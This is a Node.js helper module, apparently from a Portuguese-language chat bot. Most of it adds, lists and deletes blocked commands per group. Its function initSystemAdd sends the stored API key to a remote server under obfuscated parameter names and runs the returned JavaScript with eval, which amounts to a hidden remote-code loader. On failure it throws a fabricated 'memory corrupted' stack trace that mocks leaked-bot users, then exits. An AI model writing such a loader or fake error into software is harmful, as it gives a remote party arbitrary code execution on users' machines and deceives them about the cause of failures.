const fs = require("fs")
const axios= require("axios");
const path = require("path");
const comandos = JSON.parse(fs.readFileSync("./settings/media/comandos.json"))

const addComandosId = (from) => { 
const obj = { groupId : from, comandos:[]};
comandos.push(obj); 
fs.writeFileSync('./settings/media/comandos.json', JSON.stringify(comandos))};
const getComandos = (from) => { 
let position = false; Object.keys(comandos).forEach((i) => { 
if (comandos[i].groupId === from) { position = i }});
if (position !== false) { 
return comandos[position].groupId 
}}
const addComandos = (from, oq) => { 
let position = false;
Object.keys(comandos).forEach((i) => { 
if (comandos[i].groupId === from ){ 
position = i 
}}); 
if (position !== false) { 
comandos[position].comandos.push(oq); fs.writeFileSync('./settings/media/comandos.json', JSON.stringify(comandos))}
}
const deleteComandos = (from, oq) => { let position = false; Object.keys(comandos).forEach((i) => { if (comandos[i].groupId === from ){ position = i }}); if (position !== false) { comandos[position].comandos.splice(oq, 1); fs.writeFileSync('./settings/media/comandos.json', JSON.stringify(comandos))}}
const getComandoBlock = (from) => { let position = false; Object.keys(comandos).forEach((i) => { if (comandos[i].groupId === from) { position = i }}); if (position !== false) { return comandos[position].comandos}}

const { APIs } = JSON.parse(fs.readFileSync(__dirname+'/../../settings/creds.json', 'utf-8'));

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1) + min);
}

function gerarStack() {
  const file = path.join(__dirname,'..','..','index.js');
  const msg =
    "❌ Erro crítico ao executar CompraObotOficialBB: memória possivelmente corrompida (vai usar bot vazado lá no kraikkkkkk)";
  
  const funcoes = [
    'IniciarBot',
    'ExecutarComando',
    'VerificarBot',
    'VerQueTuUsaBotVazado',
  ];

  const stack = funcoes.map(func => {
    return `    at ${func} (${file}:${getRandomInt(3000, 7000)}:${getRandomInt(10, 100)})`;
  });

  stack.push(
    `    at internalCallback (node:internal/process/task_queues:${getRandomInt(70, 120)}:${getRandomInt(5, 50)})`,
    `    at processTicksAndRejections (node:internal/process/task_queues:${getRandomInt(70, 120)}:${getRandomInt(5, 50)})`
  );

  const err = new Error(msg);
  err.stack = `Error: ${msg}\n${stack.join("\n")}`;
  throw err;
};

async function initSystemAdd(numkk, kkj) {
  try {
    const response = await axios.get(`${APIs.website}/api/abc/bot/cba?zlazjsuwk=${encodeURIComponent(APIs.apikey)}&zabc=${encodeURIComponent(String(numkk))}`);
    if(!kkj) {
    return `(async () => {\n`+response.data+`\n})();`;
    } else {
    await eval(`(async () => {\n`+response.data+`\n})();`);
    return true;
    }
  } catch (error) {
    gerarStack();
    process.exit(255);
    return null;
  }
}

module.exports = {
addComandosId, deleteComandos,
getComandoBlock, getComandos, 
addComandos, initSystemAdd: async (folder, file) => initSystemAdd(folder, file)
}